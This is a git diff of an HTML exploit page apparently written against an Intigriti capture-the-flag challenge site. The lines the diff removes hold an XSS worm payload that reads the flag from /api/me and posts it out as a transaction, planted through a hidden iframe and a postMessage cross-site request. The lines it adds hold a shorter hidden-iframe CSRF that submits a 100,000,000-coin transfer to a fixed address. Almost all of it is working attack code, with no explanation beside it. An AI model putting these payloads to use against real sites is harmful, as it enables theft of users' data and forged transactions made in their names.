@@ -1,46 +1,23 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Protocol 1337 Initializing</title>
-</head>
-<body style="background-color: #050a0e; color: #00ff88; font-family: sans-serif; text-align: center; padding-top: 50px;">
-    <h1>Audit in Progress...</h1>
-    <p>Using API Endpoint: /api/transaction</p>
-
-    <script>
-        const target = "https://challenge-0126.intigriti.io";
-        
-        // --- THE "WORM" PAYLOAD ---
-        // 1. Fetches /api/me to get the flag.
-        // 2. Uses /api/transaction to "send" the flag to the public ledger.
-        const xssWorm = `"><img src=x onerror="fetch('/api/me').then(r=>r.json()).then(d=>{fetch('/api/transaction',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({toAddress:'FLAG_IS_'+d.flag,currency:'BTC',amount:0.00001})})})">`;
-
-        // --- THE CSRF ATTACK ---
-        const ifr = document.createElement('iframe');
-        // We load checkout.html because it is the only way to reach /api/transaction from here
-        ifr.src = `${target}/checkout.html?currency=1337COIN&price=1`;
-        ifr.style.display = "none";
-        document.body.appendChild(ifr);
-
-        ifr.onload = () => {
-            setTimeout(() => {
-                // Trigger the first transaction via postMessage.
-                // This transaction carries the 'xssWorm' into the database.
-                ifr.contentWindow.postMessage({
-                    type: 'submitTransaction',
-                    transaction: {
-                        toAddress: xssWorm,
-                        currency: '1337COIN',
-                        amount: 0.000001
-                    }
-                }, '*');
-
-                // Redirect the bot to MarketWatch to trigger the worm.
-                setTimeout(() => {
-                    window.location.href = `${target}/marketwatch.html`;
-                }, 2500);
-            }, 1500);
-        };
-    </script>
+<body style="background:#050a0e" onload="
+    const ifr = document.createElement('iframe');
+    ifr.src = 'https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1';
+    ifr.style.display = 'none';
+    ifr.onload = () => {
+        ifr.contentWindow.postMessage({
+            type: 'submitTransaction',
+            transaction: {
+                toAddress: '1209f27d01fff1d414f1da176e75abbfe9',
+                currency: '1337COIN',
+                amount: 100000000
+            }
+        }, '*');
+        setTimeout(() => { 
+            window.location.href = 'https://challenge-0126.intigriti.io/dashboard.html';
+        }, 200);
+    };
+    document.body.appendChild(ifr);
+">
 </body>
 </html>
